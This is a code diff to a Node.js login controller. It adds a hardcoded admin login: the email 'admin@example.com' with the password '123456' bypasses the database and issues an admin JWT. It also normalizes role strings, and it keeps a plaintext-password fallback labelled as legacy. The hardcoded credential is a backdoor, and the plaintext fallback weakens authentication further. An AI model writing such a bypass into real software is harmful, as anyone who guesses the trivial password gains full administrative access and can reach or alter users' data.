@@ -13,6 +13,26 @@ exports.login = (req, res) => {
     return res.status(400).json({ message: "Email and password are required" });
   }
 
+  // Hardcoded Admin Access
+  if (email === "admin@example.com" && password === "123456") {
+    const token = jwt.sign(
+      { user_id: 0, role: "admin" },
+      JWT_SECRET,
+      { expiresIn: JWT_EXPIRES_IN }
+    );
+
+    return res.status(200).json({
+      message: "Login successful",
+      token,
+      user: {
+        user_id: 0,
+        full_name: "System Administrator",
+        email: "admin@example.com",
+        role: "admin"
+      },
+    });
+  }
+
   const sql = "SELECT * FROM users WHERE email = ?";
   db.query(sql, [email], (err, result) => {
     if (err) {
@@ -32,14 +52,18 @@ exports.login = (req, res) => {
         return res.status(401).json({ message: "Invalid email or password" });
       }
 
+      // Normalize role to lowercase for consistent frontend access control
+      const normalizedRole = String(user.role || "user").toLowerCase();
+
       const token = jwt.sign(
-        { user_id: user.user_id, role: user.role },
+        { user_id: user.user_id, role: normalizedRole },
         JWT_SECRET,
         { expiresIn: JWT_EXPIRES_IN }
       );
 
       // Never send password back
       const { password: _pw, ...safeUser } = user;
+      safeUser.role = normalizedRole;
 
       res.status(200).json({
         message: "Login successful",
@@ -49,7 +73,7 @@ exports.login = (req, res) => {
     };
 
     // Support both hashed passwords (bcrypt) and plain text (legacy)
-    if (user.password && (user.password.startsWith("$2a$") || user.password.startsWith("$2b$"))) {
+    if (user.password && (String(user.password).startsWith("$2a$") || String(user.password).startsWith("$2b$"))) {
       bcrypt.compare(password, user.password, (compareErr, isMatch) => {
         if (compareErr) {
           console.error("Password compare error:", compareErr);
